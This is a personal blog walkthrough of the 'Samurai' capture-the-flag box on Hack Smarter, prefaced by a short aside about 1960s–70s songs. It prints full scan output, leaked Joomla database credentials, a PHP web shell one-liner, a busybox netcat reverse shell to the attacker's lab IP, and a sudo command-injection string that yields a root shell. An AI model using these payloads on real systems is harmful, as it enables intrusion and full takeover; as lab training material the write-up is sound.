---
title: "Samurai — Hack Smarter Walkthrough"
date: 2026-10-14T11:00:00-07:00
draft: false
author: "whitepepper01"
summary: "Owning Samurai from Hack Smarter: enumerating a Joomla 4.2.5 CMS, chaining CVE-2026-48908 for info disclosure to recover credentials, dropping a web shell via the admin panel, and escalating to root through a sudo DbMaria backup script."
categories: ["Security"]
tags: ["joomla", "rce", "linux", "hacksmarter", "oscp", "privesc"]
cover:
  image: "cover.png"
  alt: "Samurai writeup"
  relative: true
  hidden: false
---

> Box: **Samurai** (Hack Smarter). Difficulty: Medium. A Joomla CMS foothold leading to root via a sudo-able backup binary.

Here's a few songs I've really enjoyed lately.

https://www.youtube.com/watch?v=tVPlDG7RKjg

https://www.youtube.com/watch?v=J76NGCVwZrw

Fred Neil - Faretheewell and Sandy Bull - Love is Forever.

Both of these songs (I believe) were produced during the 60's and 70's. I really enjoy the sound from these decades. A lot of the production has this sort of realness and rawness to it that I enjoy. 

Fred Neil really has such an amazing voice. It reminds me a bit of Hoyt Axton in a way I can't explain.




#### Initial Enumeration

```
[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.1.251.54:22
Open 10.1.251.54:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 10.1.251.54
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-11 23:36 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:36
Completed NSE at 23:36, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:36
Completed NSE at 23:36, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:36
Completed NSE at 23:36, 0.00s elapsed
Initiating Ping Scan at 23:36
Scanning 10.1.251.54 [4 ports]
Completed Ping Scan at 23:36, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:36
Scanning Samurai (10.1.251.54) [2 ports]
Discovered open port 80/tcp on 10.1.251.54
Discovered open port 22/tcp on 10.1.251.54
Completed SYN Stealth Scan at 23:36, 0.09s elapsed (2 total ports)
Initiating Service scan at 23:36
Scanning 2 services on Samurai (10.1.251.54)
Completed Service scan at 23:36, 6.36s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against Samurai (10.1.251.54)
Retrying OS detection (try #2) against Samurai (10.1.251.54)
Initiating Traceroute at 23:36
Completed Traceroute at 23:36, 3.97s elapsed
Initiating Parallel DNS resolution of 1 host. at 23:36
Completed Parallel DNS resolution of 1 host. at 23:36, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
NSE: Script scanning 10.1.251.54.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:36
Completed NSE at 23:36, 2.54s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:36
Completed NSE at 23:36, 0.36s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:36
Completed NSE at 23:36, 0.00s elapsed
Nmap scan report for Samurai (10.1.251.54)
Host is up, received echo-reply ttl 62 (0.077s latency).
Scanned at 2026-10-11 23:36:11 EDT for 19s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c3:5a:83:50:80:9a:61:37:05:b7:45:96:cb:ab:1d:1e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDnWIbBLcbSbZZmw8nDh5DOA9ecneGMU8Ff1Rm8Frp71DcloANVhYkmErZ3+o839XNGO+k2tmXeNcwJ8jICj06M=
|   256 6b:15:12:60:1b:21:d1:bf:7e:b8:c0:e8:d7:7e:7b:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9JIv57fNRXYSBb4BDtI+WNZG/hfJuGHaaMLL7Iu9PG
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Samurai
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 3E18B73692FF5A74F54EFFB2E047C8CB
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 (99%), Linux 2.6.32 - 3.13 (96%), Linux 5.0 - 5.14 (96%), Linux 5.14 - 6.8 (96%), Linux 3.2 - 4.14 (96%), Linux 4.15 - 5.19 (96%), Linux 2.6.32 - 3.10 (96%), Linux 5.4 - 5.15 (95%), Linux 3.10 - 4.11 (95%), Linux 2.6.32 - 3.5 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.99%E=4%D=10/11%OT=22%CT=%CU=37603%PV=Y%DS=3%DC=T%G=N%TM=6ACC55BE%P=x86_64-pc-linux-gnu)
SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)
SEQ(SP=101%GCD=1%ISR=103%TI=Z%CI=Z%TS=A)
OPS(O1=M510ST11NW7%O2=M510ST11NW7%O3=M510NNT11NW7%O4=M510ST11NW7%O5=M510ST11NW7%O6=M510ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M510NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 2.948 days (since Fri Oct  9 00:51:24 2026)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   73.87 ms 10.200.0.1
2   ...
3   76.29 ms Samurai (10.1.251.54)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:36
Completed NSE at 23:36, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:36
Completed NSE at 23:36, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:36
Completed NSE at 23:36, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.07 seconds
           Raw packets sent: 69 (4.728KB) | Rcvd: 40 (3.056KB)
```

`Ubuntu` Server, most likely Linux.

`Open SSH 8.91p1` `Apache httpd 2.4.52`

#### Port 22

![Pasted image 20261011203815.png](Pasted_image_20261011203815.png)

Password based authentication


#### Port 80

![Pasted image 20261011204015.png](Pasted_image_20261011204015.png)


![Pasted image 20261011203948.png](Pasted_image_20261011203948.png)

Nothing interesting on the source page, really.

Decided to run a dirsearch since nothing on the page is interactable, nor is it really popping out with anything.

`Katana`, `Wakizashi`, `Tachi`, and `Tanto`. Some of the weapons used by Samurais. 

Just interesting, maybe those words will come in handy for some reason later.

![Pasted image 20261011204848.png](Pasted_image_20261011204848.png)

There's lots of the blank pages for directories, such as `api` `plugins` and `cli` , which I assume to be standing for `command line interface`. 

![Pasted image 20261011205133.png](Pasted_image_20261011205133.png)

Oh nice, we found an administrator page!

![Pasted image 20261011205230.png](Pasted_image_20261011205230.png)

Content Management System. Gotcha.

Testing with `admin:admin` 

![Pasted image 20261011205321.png](Pasted_image_20261011205321.png)

We see 'Username and password not match or you do not have an account yet'

Fairly safe banner.

![Pasted image 20261011205553.png](Pasted_image_20261011205553.png)

Decided to start reading a bit about the website just to see what it's all about anyway.

![Pasted image 20261011205712.png](Pasted_image_20261011205712.png)

![Pasted image 20261011205841.png](Pasted_image_20261011205841.png)

There's a configuration file somewhere.

![Pasted image 20261011205933.png](Pasted_image_20261011205933.png)

Potentially MySQL in the background.

![Pasted image 20261011210031.png](Pasted_image_20261011210031.png)

Potentially salted passwords in the backend.

![Pasted image 20261011210126.png](Pasted_image_20261011210126.png)

I'll let this just run in the background.  1.2million directories to go! Lol.

Decided at least to try `admin:secret`, nothing.

Since we know there is potentially SQL in the background, I thought maybe we try some SQL injection here.

Loaded up `Burp Suite`.

Oh, also forgot to add there is some additional information on here.

![Pasted image 20261011210536.png](Pasted_image_20261011210536.png)

`PHP`.

![Pasted image 20261011210552.png](Pasted_image_20261011210552.png)

Admin login ends up redirecting us to the index.php page also, if it was not noticed in wappalyzer.

![Pasted image 20261011210735.png](Pasted_image_20261011210735.png)

This request actually has a bit more than I expected.

Parameters = `username, passwd, option, task, return`

Bit more curious with the `option` parameter as well as the `return` and `task`.

![Pasted image 20261011211020.png](Pasted_image_20261011211020.png)

Sent that request and got a 303 See other?

![Pasted image 20261011211123.png](Pasted_image_20261011211123.png)

I actually don't think I knew this code existed.

Should we try changing the request to a `GET`?

The `GET` request came up with our same page that we had before, but there is just a ton of information here I'm just not sure is necessary for a client side user to see..

![Pasted image 20261011211416.png](Pasted_image_20261011211416.png)

![Pasted image 20261011211447.png](Pasted_image_20261011211447.png)

![Pasted image 20261011211530.png](Pasted_image_20261011211530.png)

Editing the request a little bit to check and see if there are any SQL syntax errors we can spot on the webpage.

![Pasted image 20261011211656.png](Pasted_image_20261011211656.png)

Don't think this matters, but it's interesting nonetheless.

![Pasted image 20261011213745.png](Pasted_image_20261011213745.png)

I randomly took away the token at the bottom of the request and got an interesting error page.

`The security token did not match. The request was aborted to prevent a security breach. Try again.`

This is what I mean when I say my enumeration needs a lot of work. At this point I have relatively few ideas of what to do, the next thing I might try is to brute force some the usernames and passwords?

I decided it's important to at least directory search the administrator directory to see if there's anything specific.

![Pasted image 20261011215121.png](Pasted_image_20261011215121.png)

So far nothing crazy.

Tried `admin,samurai:weapons` from the first page just to hit all avenues there.

![Pasted image 20261011215431.png](Pasted_image_20261011215431.png)

Maybe we can do some sort of directory traversal to read this configuration file.

![Pasted image 20261011215656.png](Pasted_image_20261011215656.png)

I mean essentially the page loaded, but there is no information here.

![Pasted image 20261011215807.png](Pasted_image_20261011215807.png)

Made sure to check in a burp request as well.

![Pasted image 20261012132449.png](Pasted_image_20261012132449.png)

Is the `JoomlaAPI1.0` something I should have seen earlier? I've been using AI a bit to help me disclose a bit more information, as I just got stuck here at this point.

![Pasted image 20261012132725.png](Pasted_image_20261012132725.png)

`Joomscan` gives up a identifiable Joomla Version of `4.2.5` .

![Pasted image 20261012133002.png](Pasted_image_20261012133002.png)

Looks like this exploit gives us a bit on information disclosure.

![Pasted image 20261012133553.png](Pasted_image_20261012133553.png)

Getting some load errors, but this GitHub page from `Acceis` shows how to install dependencies.

![Pasted image 20261012133634.png](Pasted_image_20261012133634.png)

![Pasted image 20261012133943.png](Pasted_image_20261012133943.png)

```
SuperUser: miyamoto
joomla425:Pa847word987@Joomla456
```

Since there was no password aligned, I may try to do a brute force attack with the username at least.

I tried another exploit that uploaded a shell.

Didn't seem to work, tried a few different ports. The website that the exploit appeared to be vulnerable at least so that's good.

https://github.com/0xgh057r3c0n/CVE-2026-48907

1) [x] Spray credentials across SSH
2) [x] Upload a web shell with the JCE Extension RCE.

Couldn't get that exploit to work, and I sprayed the credentials I found across SSH.

Tried another exploit here.

https://github.com/papageo75/CVE-2026-48908-PoC

![Pasted image 20261013132004.png](Pasted_image_20261013132004.png)![Pasted image 20261013132004.png](Pasted_image_20261013132004.png)

Holy shit I didn't realize the name `Oda` was `Miyamoto`. I need to look in between the lines.

![Pasted image 20261013134555.png](Pasted_image_20261013134555.png)



![Pasted image 20261013140449.png](Pasted_image_20261013140449.png)

![Pasted image 20261013140515.png](Pasted_image_20261013140515.png)

![Pasted image 20261013140537.png](Pasted_image_20261013140537.png)


![Pasted image 20261013134420.png](Pasted_image_20261013134420.png)


This error'd the page out so I had to restart it.

I tried to do it with a reverse shell, but maybe we do it another way.

Here's a part of the walkthrough from `0xb0b`.

![Pasted image 20261013140029.png](Pasted_image_20261013140029.png)

Decided to use that command for the web shell instead.

![Pasted image 20261013140642.png](Pasted_image_20261013140642.png)

```
if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }
```

![Pasted image 20261013141259.png](Pasted_image_20261013141259.png)

Awesome! We are able to call it from the administrator web page.

Let's see.. why the busybox command?

![Pasted image 20261013141716.png](Pasted_image_20261013141716.png)

![Pasted image 20261013141754.png](Pasted_image_20261013141754.png)

```
busybox nc 10.200.106.221 4444 -e /bin/bash
```

![Pasted image 20261013142936.png](Pasted_image_20261013142936.png)

Woohoo.

![Pasted image 20261013143314.png](Pasted_image_20261013143314.png)

My user can backup DbMaria? I wonder if I can just send that to a file and read it somehow.

- [x] Try to start a shell with this command
- [x] Create a DB, or back that up
- [x] Create a random file and try to back that up
- [x] Find another database to back up and check?



![Pasted image 20261014102732.png](Pasted_image_20261014102732.png)

That has nothing to do with it, I got stuck for a while and had to look it up. 

But this is the rest of the command that I need, I tried it with a pipe but that didn't work.

```
sudo /opt/backup/DbMaria 'DbJoomla; /bin/bash -p #'
```

My original try was..

```
sudo /opt/backup/DbMaria DbJoomla | /bin/bash'
```

I was curious why you needed the #, I still don't fully understand the necessity for the comment, but I think it can break the shell. I will note this for anytime I'm trying to run a script to execute a shell of some kind.

![Pasted image 20261014105728.png](Pasted_image_20261014105728.png)

We root.

